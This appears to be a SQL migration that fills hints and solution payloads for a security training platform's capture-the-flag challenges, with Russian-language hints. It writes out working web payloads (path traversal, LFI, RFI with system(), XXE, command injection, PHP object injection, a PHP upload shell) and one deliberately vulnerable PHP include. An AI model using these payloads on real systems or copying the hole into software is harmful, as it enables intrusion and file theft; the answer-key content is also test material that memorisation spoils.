UPDATE academy.challenges
SET hint_2 = $mv$GET /api/inventory/orders/1 с токеном student. Если заказ принадлежит другому покупателю, в JSON появляется поле flag.$mv$,
    solution_payload = $mv$curl http://localhost:4000/api/inventory/orders/1 \
  -H "Authorization: Bearer <student-token>"$mv$
WHERE slug = 'inventory-idor';

UPDATE academy.challenges
SET hint_2 = $mv$POST /api/inventory/redeem принимает amount. Параллельные запросы читают баланс до записи; если баланс уходит в минус, сервис возвращает флаг.$mv$
WHERE slug = 'inventory-race-condition';

UPDATE academy.challenges
SET hint_2 = $mv$GET /api/inventory/files?name=... читает файл из /srv/inventory/files без проверки границ каталога.$mv$,
    solution_payload = $mv$GET /api/inventory/files?name=../../../../var/www/flags/inventory.txt$mv$
WHERE slug = 'inventory-path-traversal';

UPDATE academy.challenges
SET hint_2 = $mv$GET /legacy/report.php?page=... подключает файл из pages. Флаг лежит в /var/www/flags/lfi.txt.$mv$,
    solution_payload = $mv$/legacy/report.php?page=../../flags/lfi.txt$mv$,
    vulnerable_code = $mv$<?php
$page = $_GET["page"] ?? "summary.php";
include __DIR__ . "/pages/" . $page;
?>
$mv$
WHERE slug = 'legacy-lfi';

UPDATE academy.challenges
SET hint_2 = $mv$GET /legacy/template.php?page=... передаёт значение в include. allow_url_include включён. Флаг: /var/www/flags/rfi.txt.$mv$,
    solution_payload = $mv$/legacy/template.php?page=data://text/plain,<?php system('cat /var/www/flags/rfi.txt');?>$mv$
WHERE slug = 'legacy-rfi';

UPDATE academy.challenges
SET hint_2 = $mv$POST /legacy/import.php с XML. Внешняя сущность SYSTEM читает локальный файл /var/www/flags/xxe.txt.$mv$,
    solution_payload = $mv$<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///var/www/flags/xxe.txt">]>
<invoice><note>&xxe;</note></invoice>$mv$
WHERE slug = 'legacy-xxe';

UPDATE academy.challenges
SET hint_2 = $mv$GET /legacy/ping.php?host=... передаёт ввод в system. Флаг лежит в /var/www/flags/cmd.txt.$mv$,
    solution_payload = $mv$/legacy/ping.php?host=127.0.0.1;cat%20/var/www/flags/cmd.txt$mv$
WHERE slug = 'legacy-command-injection';

UPDATE academy.challenges
SET hint_2 = $mv$Cookie prefs десериализуется. Класс CacheFile читает файл в __destruct. Флаг: /var/www/flags/unserialize.txt.$mv$,
    solution_payload = $mv$prefs=O:9:"CacheFile":1:{s:4:"path";s:30:"/var/www/flags/unserialize.txt";}$mv$
WHERE slug = 'legacy-php-object-injection';

UPDATE academy.challenges
SET hint_2 = $mv$POST /legacy/upload.php сохраняет файл в исполняемый каталог uploads. Флаг: /var/www/flags/upload.txt.$mv$,
    solution_payload = $mv$curl -F 'file=@shell.php' http://localhost:4000/legacy/upload.php
# shell.php: <?php echo file_get_contents('/var/www/flags/upload.txt'); ?>
/legacy/uploads/shell.php$mv$
WHERE slug = 'legacy-upload-php';